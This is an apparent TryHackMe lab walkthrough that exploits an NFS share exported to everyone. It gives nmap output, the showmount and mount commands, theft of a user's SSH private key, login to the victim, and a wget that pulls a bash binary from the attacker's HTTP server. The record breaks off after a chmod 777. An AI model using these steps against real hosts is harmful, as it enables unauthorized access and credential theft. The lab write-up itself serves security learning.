### Basic Details 
Victim :**10.10.71.159**
Attacker : **10.9.18.195**
Room: [Network Services 2](https://tryhackme.com/room/networkservices2) 

**NFS-Common**

It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: **l****ockd, statd**, **showmount**, **nfsstat,** **gssd**, **idmapd** and **mount.nfs**. Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share. If you'd like more information about this package, feel free to read: [https://packages.ubuntu.com/jammy/nfs-common](https://packages.ubuntu.com/jammy/nfs-common).

You can install **nfs-common** using "_sudo apt install nfs-common_", it is part of the default repositories for most Linux distributions such as the Kali Remote Machine or AttackBox that is provided to TryHackMe.

1. Scan the NMap to scan for the open ports:

```shell
nmap -A -p-  -T3 -sX -oN scan1 10.10.71.159

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-26 08:58 EST
Nmap scan report for 10.10.71.159
Host is up (0.0089s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      43265/tcp   mountd
|   100005  1,2,3      47408/udp   mountd
|   100005  1,2,3      49247/tcp6  mountd
|   100005  1,2,3      59332/udp6  mountd
|   100021  1,3,4      34009/udp   nlockmgr
|   100021  1,3,4      34895/tcp   nlockmgr
|   100021  1,3,4      35949/tcp6  nlockmgr
|   100021  1,3,4      42979/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
34895/tcp open  nlockmgr 1-4 (RPC #100021)
43265/tcp open  mountd   1-3 (RPC #100005)
48509/tcp open  mountd   1-3 (RPC #100005)
53135/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/26%OT=22%CT=1%CU=43079%PV=Y%DS=2%DC=T%G=Y%TM=63821B
OS:B1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST
OS:11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   11.13 ms 10.9.0.1
2   11.80 ms 10.10.71.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.18 seconds
```
- Found 7 open ports 
```shell
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs_acl  3 (RPC #100227)
34895/tcp open  nlockmgr 1-4 (RPC #100021)
43265/tcp open  mountd   1-3 (RPC #100005)
48509/tcp open  mountd   1-3 (RPC #100005)
53135/tcp open  mountd   1-3 (RPC #100005)
```
Will need to target: 
```shell
2049/tcp  open  nfs_acl  3 (RPC #100227)
```

2. found the list of sharemounts using the following:
```shell
usr/sbin/showmount -e 10.10.71.159

Export list for 10.10.71.159:
/home *

```
 3. created the folder on the attack machine that will mount the share to 
 ```shell
 mkdir /tmp/mount
```
4. changed the share in the command inorder to mount the drive 
```shell
sudo mount -t nfs 10.10.71.159:home /tmp/mount -nolock
```
5. Went into the /tmp/mount and found folder cappucino, DONT restart system otherwise the share will disappear.
```shell
ls /tmp/mount 

cappucino
```

6. Copied the the files to a folder on the local machine and found id_rsa file that can be used to access ssh. CHmod the file in order to use it 
```shell
chmod 600 id_rsa
```

7. SSHed in the victim machine using cappucino 
```shell
ssh -i id_rsa cappucino@10.10.71.159
```
8. Copied bash over to the file share by setting up a server on 8000 on the attack machine and get the victim to dowload the bash script
```shell
#Attack machine 
python3 -m http.server 8000

#Victim downloads bash from the server 
wget ip:8000/bash
```

9. changed permissions to bash to 777
```shell
chmod 777 bash 
```